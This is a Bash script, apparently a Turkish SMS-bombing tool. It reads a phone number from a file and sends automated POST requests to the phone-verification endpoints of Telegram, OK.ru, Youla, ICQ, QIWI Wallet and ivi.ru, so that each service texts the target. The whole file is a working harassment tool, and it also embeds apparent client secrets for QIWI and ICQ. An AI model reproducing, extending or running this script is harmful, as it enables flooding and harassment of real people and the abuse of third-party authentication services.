#!/bin/bash
numara=$(cat numara.txt)
clear
bash banner.sh
progress () {
echo -ne " \e[42;30mSending: [10%]\e[0;97m  [##.......................]\r"
sleep 2
echo -ne " \e[42;30mSending: [25%]\e[0;97m  [#####....................]\r"
sleep 2
echo -ne " \e[42;30mSending: [50%]\e[0;97m  [############.............]\r"
sleep 2
echo -ne " \e[42;30mSending: [75%]\e[0;97m  [###################......]\r"
sleep 2
echo -ne " \e[42;30mSending: [100%]\e[0;97m [#########################]\r"
echo -ne '\n'
}
echo
progress
curl -s -X POST https://my.telegram.org/auth/send_password --data-urlencode phone="$numara" > test
if [[ $(cat test |grep -o hash) == hash ]];then
	echo
	printf " \e[32m[✓]\e[97m GÖNDERİLDİ \e[31m>>\e[1;4;97m TELEGRAM\e[0m"
	echo
fi
echo
progress
curl -s -X POST "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone" --data-urlencode st.r.phone="$numara" > test
echo
printf " \e[32m[✓]\e[0;97m GÖNDERİLDİ \e[31m>>\e[1;4;97m OK.RU\e[0m"
echo
echo
progress
curl -s --user-agent "Mozilla / 5.0 (Linux; U; Android 2.2) AppleWebKit / 533.1 Sürüm / 4.0 Mobil Safari / 533.1" -X POST https://youla.ru/web-api/auth/request_code --data-urlencode phone="$numara" > test
if [[ $(cat test |grep phone) == phone ]];then
	echo
	printf " \e[32m[✓]\e[97m GÖNDERİLDİ \e[31m>>\e[1;4;97m YOULA\e[0m"
	echo
fi
echo
progress
curl -s -X POST https://www.icq.com/smsreg/requestPhoneValidation.php -d msisdn="$numara" -d locale="en" -d countryCode="tr" -d version="1"  -d k="ic1rtwz1s1Hj1O0r" -d r="46763" > test
if [[ $(cat test |grep -o statusCode\":200,\") == statusCode\":200,\" ]];then
	echo
	printf " \e[32m[✓]\e[97m GÖNDERİLDİ \e[31m>>\e[1;4;97m ICQ\e[0m"
	echo
fi
echo
progress
numaraa=$(cat numara.txt |tr -d "+")
curl -s -X POST https://mobile-api.qiwi.com/oauth/authorize -d response_type="urn:qiwi:oauth:response-type:confirmation-id" -d username="$numaraa" -d client_id="android-qw" -d client_secret="zAm4FKq9UnSe7id" > test
if [[ $(cat test |grep -o id) == id ]];then
	echo
	printf " \e[32m[✓]\e[97m GÖNDERİLDİ \e[31m>>\e[1;4;97m QIWIWallet\e[0m"
	echo
fi
echo
progress
curl -s -X POST https://api.ivi.ru/mobileapi/user/register/phone/v6/ -d phone="$numara" -d device="Windows+v.43+Chrome+v.7453451" -d app_version="870" > test
if [[ $(cat test |grep -o true) == true ]];then
	echo
	printf " \e[32m[✓]\e[97m GÖNDERİLDİ \e[31m>>\e[1;4;97m İVİ\e[0m"
	echo
fi
echo
echo
